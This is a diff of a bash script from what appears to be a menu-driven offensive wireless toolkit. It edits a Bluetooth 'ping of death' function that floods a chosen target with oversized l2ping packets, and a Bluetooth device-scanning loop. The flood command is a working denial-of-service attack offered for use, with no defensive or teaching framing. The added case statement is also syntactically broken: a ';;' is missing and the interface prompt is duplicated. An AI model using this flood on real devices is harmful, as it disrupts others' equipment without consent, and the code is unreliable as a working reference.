@@ -919,12 +919,27 @@ bt_pod()
     printf "\e[0m\n"
     read -p "INTERFACE: " device
     read -p "TARGET: " target
-    printf "\e[93mSTARTING BT PING OF DEATH ATTACK...\n"
+    read -p "START ATTACK? (y/n): " logs
+    case $logs in
+        [yY][eE][sS]|[yY])
+    read -p "INTERFACE: " device
+    printf "$inf STARTING BT PING OF DEATH ATTACK...\n"
     hciconfig $device up
     l2ping -i $device -s 600 -f $target 
-    printf "DONE!\n"
+    printf "$inf "
     read -p "press [ENTER] to back" variable
     auramenu
+        [nN][oO]|[nN])
+            printf "$inf STARTING SCAN...\e[0m\n"
+            hciconfig $device up
+            while [ 1 ]; do hcitool scan;printf "$inf RETRYING... HIT CTRL+C TO KILL\e[0m\n";done
+            printf "$inf "
+            read -p "PRESS [ENTER] TO BACK" variable
+            auramenu
+            ;;
+        *) printf "$red";exit
+        ;;
+    esac
 }
 
 bt_scan()
@@ -932,26 +947,60 @@ bt_scan()
     banner
     printf "\e[0m\n"
     read -p "INTERFACE: " device
-    read -p "SAVE LOGS? (y/n): " logs
-    case $logs in
+    printf "$quest "
+    read -r -p "SAVE LOGS? (Y/N): " logsq
+    printf "\n"
+    case $logsq in
         [yY][eE][sS]|[yY])
-            read -p "OUTPUT: " log
-            printf "\n\e[93mSTARTING SCAN...\n"
-            hciconfig $device up
-            while [ 1 ]; do hcitool scan >> $log;printf "\n\e[93mDONE!\nRETRYING... HIT CTRL+C TO KILL\e[0m\n";done
-            printf "\nDONE!\n"
-            read -p "press [ENTER] to back" variable
-            auramenu
-            ;;
+            printf "$quest "
+            read -r -p "START SCAN? (Y/N): " yesorno
+            case $yesorno in
+                [yY][eE][sS]|[yY])
+                read -p "OUTPUT: " log
+                printf "\n\e[93mSTARTING SCAN...\n"
+                hciconfig $device up
+                while [ 1 ]; do hcitool scan >> $log;printf "$info DONE!$info RETRYING... HIT CTRL+C TO KILL\e[0m\n";done
+                printf "$info "
+                read -p "PRESS [ENTER] TO BACK" variable
+                auramenu
+                ;;
+                [nN][oO]|[nN])
+                printf "$inf BACKING TO MENU..."
+                sleep 1.2
+                auramenu
+                ;;
+                *)
+                printf "$red"
+                exit
+                ;;
+            esac
+        ;;
         [nN][oO]|[nN])
-            printf "\n\e[93mSTARTING SCAN...\e[0m\n"
-            hciconfig $device up
-            while [ 1 ]; do hcitool scan;printf "\n\e[93mRETRYING... HIT CTRL+C TO KILL\e[0m\n";done
-            printf "[*] Scan complete\n"
-            read -p "press [ENTER] to back" variable
-            auramenu
-            ;;
-        *) printf "\e[93mINCORRECT OPTION...";exit
+           printf "$quest "
+           read -r -p "START SCAN? (Y/N): "                yesorno
+           case $yesorno in
+                [yY][eE][sS]|[yY])
+                printf "\n\e[93mSTARTING SCAN...\e[0m\n"
+                hciconfig $device up
+                while [ 1 ]; do hcitool scan;printf "\n\e[93mRETRYING... HIT CTRL+C TO KILL\e[0m\n";done
+                printf "$inf "
+                read -p "PRESS [ENTER] TO BACK" variable
+                auramenu
+                ;;
+                [nN][oO]|[nN])
+                printf "$inf BACKING TO MENU..."
+                sleep 1.2
+                auramenu
+                ;;
+                *)
+                printf "$red"
+                exit
+                ;;
+            esac
+        ;;
+        *)
+        printf "$red"
+        exit
         ;;
     esac
 }
